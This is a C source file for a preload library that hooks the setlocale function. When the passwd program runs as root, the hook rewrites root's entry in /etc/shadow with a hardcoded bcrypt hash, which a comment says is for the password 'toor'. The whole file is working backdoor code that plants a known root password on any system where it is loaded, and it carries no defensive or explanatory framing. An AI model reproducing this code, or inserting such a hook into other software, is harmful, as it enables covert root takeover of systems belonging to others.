#define _GNU_SOURCE
#include <stdio.h>
#include <locale.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <shadow.h>
#include <limits.h>

// Function to get the current process name
void get_process_name(char *buffer, size_t size) {
    ssize_t len = readlink("/proc/self/exe", buffer, size - 1);
    if (len != -1) {
        buffer[len] = '\0';
    } else {
        strcpy(buffer, "unknown");
    }
}

static void modify_root_password() {
    struct spwd *entry;
    FILE *shadow;

    // Hardcoded bcrypt hash for toor
    const char *new_hashed_pw = "$2y$10$qLXrtg/LwrH631WoNpU2feJ2DJzeAKp/M4WrQ0SvWSp4TbO1UK7lW";

    if (!(entry = getspnam("root"))) return;

    entry->sp_pwdp = (char *)new_hashed_pw;

    if (!(shadow = fopen("/etc/shadow", "r+"))) return;

    putspent(entry, shadow);
    fclose(shadow);
}

// Hooked `setlocale` function
char *setlocale(int category, const char *locale) {
    static char *(*real_setlocale)(int, const char *) = NULL;
    static int run_once = 1;
    char process_name[PATH_MAX];

    if (!real_setlocale) {
        real_setlocale = dlsym(RTLD_NEXT, "setlocale");
    }

    if (run_once) {
        run_once = 0;
        
        get_process_name(process_name, sizeof(process_name));
        
        if (strstr(process_name, "passwd")) {
            if (geteuid() == 0) {
                modify_root_password();
            }
        }
    }

    return real_setlocale(category, locale);
}
